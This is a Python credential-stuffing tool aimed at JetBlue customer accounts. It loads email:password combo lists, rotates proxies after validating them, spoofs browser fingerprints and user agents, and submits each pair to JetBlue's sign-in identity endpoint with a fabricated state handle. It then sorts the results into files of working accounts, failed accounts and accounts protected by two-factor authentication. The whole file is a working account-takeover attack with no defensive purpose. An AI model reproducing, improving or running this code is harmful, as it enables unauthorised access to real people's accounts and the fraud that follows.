import requests, threading, random, os, json


class color:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    RESET_ALL = "\033[0m"

working_proxies = []
error = None

path_to_config = os.path.abspath('./config')
path_to_out = os.path.abspath('./out')
file_path = os.path.join(path_to_config, "config.json")
with open(file_path, 'r') as file: config = json.load(file)


def proxy_appender(proxy_url: str, proxy_protocol: str) -> None:
    global error

    proxies = None

    if proxy_protocol == 'HTTP':
        proxies = {
            'http': f"http://{proxy_url}",
            'https': f"http://{proxy_url}"
        }
    elif proxy_protocol == 'SOCKS4':
        proxies = {
            'http': f"socks4://{proxy_url}",
            'https': f"socks4://{proxy_url}"
        }
    elif proxy_protocol == 'SOCKS5':
        proxies = {
            'http': f"socks5://{proxy_url}",
            'https': f"socks5://{proxy_url}"
        }

    else:
        error = 'Invalid proxy protocol.'

    try:
        a = requests.get("http://ip-api.com/json/", proxies=proxies, timeout=10, verify=False)
        working_proxies.append(proxies["http"].split("//")[1])
    except:
        pass


class proxy_checker:
    def __init__(self, config):
        self.config = config

    def check_proxies(self) -> list:
        global error, working_proxies

        with open(f'./config/proxies.txt') as file:
            proxies = [line.rstrip() for line in file.readlines()]
    

        threads = []
        for proxy_url in proxies:
            t = threading.Thread(target=proxy_appender, args=(proxy_url, self.config["PROXY_TYPE"],))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        if error:
            return [False, error]

        if len(working_proxies) == 0:
            return [False, 'Proxies not working. Please fill proxies.txt with new proxies.']

        return [True, working_proxies, len(working_proxies)]
    

class API:
    def __init__(self, id: int, account: dict, proxies: list = None) -> bool:
        self.session = requests.Session()
        self.account = account
        self.id = id
                
        stop = True
        while stop:
            res = requests.get("https://fingerprints.bablosoft.com/preview?rand=0.1&tags=Chrome").json()
            if "ua" in res:
                useragent = res["ua"]
                stop = False

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en;q=0.9',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': useragent,
        }

        self.session.headers.update(headers)

        if proxies:
            print(f"{color.GREEN}[{id}]{color.RESET_ALL} Proxy Using. Account -> {color.GREEN}{self.account}{color.RESET_ALL}")
            if config["PROXY_TYPE"] == "HTTP":
                self.session.proxies.update({"http": f"http://{random.choice(proxies)}", "https": f"http://{random.choice(proxies)}"})
            elif config["PROXY_TYPE"] == "SOCKS4":
                self.session.proxies.update({"http": f"socks4://{proxies}", "https": f"socks4://{proxies}"})
            elif config["PROXY_TYPE"] == "SOCKS5":
                self.session.proxies.update({"http": f"socks5://{proxies}", "socks5": f"socks4://{proxies}"})

        print(f"{color.GREEN}[{id}]{color.RESET_ALL} Session Created. Account -> {color.GREEN}{self.account}{color.RESET_ALL}")


    def get_cookies(self):
        url = "https://www.jetblue.com/signin?useIdx=true&returnUrl="
        response = self.session.get(url)
        self.session.cookies.update(response.cookies)


    def check_account(self):
        try:
            url = "https://accounts.jetblue.com/idp/idx/identify"

            fake_state_id = f"02.id.{random.randint(11111,99999)}rRWTBSR_z5_kYW5RGOGjS-G6tFRIW4suDDxP0W9Y~c.qc3AUrh7HMI0wXIISjfkk7t7vsA6Vtp7obrWFF7Ivrg5I_0ztvFD1z1lTJ6VjZRzwYBfMIQSEzQ1qTsmBbPrunqNAhf340cG8eW4wCDy9OcHhRd0zqYRSivU6WZc_6L2tKH3tXIvspc98kqqIU6C3c5bo5xguGLCdRA3t_4zTwglEbphMmghlwhTYIxdmdBmnI8V-gjQTUtfsr0yDCGrC7RkNqvO9qFXKt5-9N8Sq3S0JxAu5g2Ee47bpPlCI_7NbGZEh1xAQz-ad_l29gd_p3-5WHGQTKwkfGqUJ3mRGsi8EDHEUxk5GXDScPS9zPlF3p0fi_YC0AhDkrczfibis0I-c45fsBUi54m3YzFhAn-xuyeNGGEJg3sAZ58Gw32vqMVcmd7ReYMQkg2ef49D2CPoLXIUpjYeQ3lp6t5WskZhNa0l5o2bvrakF-iQ19m1SN0FCwPLjqDSqbDDghJeZIecNW7pv3rkQuWtuE6TqDA9-Tz-pqAuSlO-O7SQnBhdAMxLWWmS0NejRbgC-qmEdUZHC42qg1BrXZvBDbp6vuJGPi7rQJ6wV5zT0c_PuBMNQzYXxrX97sFdMDXvAimy2UgBoh5S8cylY9zqjVFa6yJlS_GqUKHF-_cf9Yr7v560oJOfWAKH5RfKaSrcccVBzXNZn37GQHj4UX2cAikhwLbZ8wNjEMtfHy6dTMx-nljsq_8qGXrg07CyDBGdQLqi3Zw5rWQjVGvYljh8UBX_i8DOE0H1rlFrsQxEmCko5FX2GwCcsmqebWGUOVXUEZCUC2uucFjIAAPkAp1sAAzfj2Z571Y44M8b1LlQo_fxzUr3pMy2cCF4Dd1DZqU8OEOx_jinHBSxrQZ9Us9kwya-N4VK7gbMx0TF1VnAVX0M7i0dSe-b-mWtiYtUJNV3x-fP3K9-aqP1now-X2j2RJplMnT2WHWRemywnPjHbxZXh1D1"
            payload = {
                "identifier": self.account["email"],
                "credentials": {
                    "passcode": self.account["password"]
                },
                "stateHandle": fake_state_id
            }

            response = self.session.post(url, json=payload)
            self.session.cookies.update(response.cookies)
            statehandle = response.json()["stateHandle"]
        
            payload = {
                "identifier": self.account["email"],
                "credentials": {
                    "passcode": self.account["password"]
                },
                "stateHandle": statehandle
            }

            response = self.session.post(url, json=payload)
            self.session.cookies.update(response.cookies)
            session_id = response.json()["stateHandle"]

            payload = {
                "identifier": self.account["email"],
                "credentials": {
                    "passcode": self.account["password"]
                },
                "stateHandle": session_id
            }

            response = self.session.post(url, json=payload)
            if "success" in str(response.text):
                print(f"{color.GREEN}[{self.id}]{color.RESET_ALL} Account Working -> {color.GREEN}{self.account}{color.RESET_ALL}")
                json = os.path.join(path_to_out, "working.txt")
                with open(json, 'a') as f:
                    f.write(f"{self.account['email']}:{self.account['password']}\n")

            elif "Authentication failed" in str(response.text):
                print(f"{color.RED}[{self.id}]{color.RESET_ALL} Account Not Working -> {color.RED}{self.account}{color.RESET_ALL}")
                json = os.path.join(path_to_out, "failed.txt")
                with open(json, 'a') as f:
                    f.write(f"{self.account['email']}:{self.account['password']}\n")

            elif "openid email" in str(response.text):
                print(f"{color.YELLOW}[{self.id}]{color.RESET_ALL} Account have 2fa -> {color.YELLOW}{self.account}{color.RESET_ALL}")
                json = os.path.join(path_to_out, "2fa.txt")
                with open(json, 'a') as f:
                    f.write(f"{self.account['email']}:{self.account['password']}\n")
        except:
            pass
            


def worker():
    accounts_file = os.path.join(path_to_config, "combo.txt")
    with open(accounts_file, 'r') as file:
        accounts = [line.strip().split(":") for line in file.readlines()]

    proxies = None
    if config["PROXY_USAGE"]:
        checker = proxy_checker(config)
        result = checker.check_proxies()
        if result[0]:
            proxies = result[1]
        else:
            print(f"{color.RED}Proxy Error: {result[1]}{color.RESET_ALL}")
            return

    threads = []
    for idx, account in enumerate(accounts):
        acc_dict = {"email": account[0], "password": account[1]}
        t = threading.Thread(target=API(idx+1, acc_dict, proxies,).check_account)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()



if __name__ == "__main__":
    worker()